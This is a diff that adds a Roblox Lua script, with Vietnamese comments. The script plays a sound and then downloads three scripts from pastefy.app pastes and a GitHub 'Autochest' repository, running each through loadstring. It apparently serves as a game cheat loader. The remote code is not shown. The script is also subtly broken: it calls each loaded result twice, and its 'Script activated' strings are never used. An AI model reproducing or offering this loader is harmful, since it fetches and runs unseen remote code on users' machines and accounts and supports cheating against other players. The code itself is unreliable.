@@ -1,0 +1,31 @@
+-- Đặt AssetId cho âm thanh
+local soundId = "rbxassetid://7817336081"
+
+-- Lấy đối tượng âm thanh từ nơi phát âm thanh (ví dụ: Workspace)
+local sound = Instance.new("Sound")
+sound.SoundId = soundId
+sound.Parent = game.Workspace -- Hoặc bạn có thể thay đổi thành nơi khác
+sound:Play() -- Phát âm thanh
+
+-- Tạo 3 script với loadstring và thực thi chúng
+
+-- Script 1
+local script1 = "print('Script 1 activated!')"
+local func1 = loadstring(game:HttpGet("https://pastefy.app/MzLvhyle/raw"))()
+if func1 then
+    func1()
+end
+
+-- Script 2
+local script2 = "print('Script 2 activated!')"
+local func2 = loadstring(game:HttpGet("https://pastefy.app/SdsUNVv2/raw"))()
+if func2 then
+    func2()
+end
+
+-- Script 3
+local script3 = "print('Script 3 activated!')"
+local func3 = loadstring(game:HttpGet("https://raw.githubusercontent.com/UyenthytH/Autochest/refs/heads/main/ChestPART1"))()
+if func3 then
+    func3()
+end
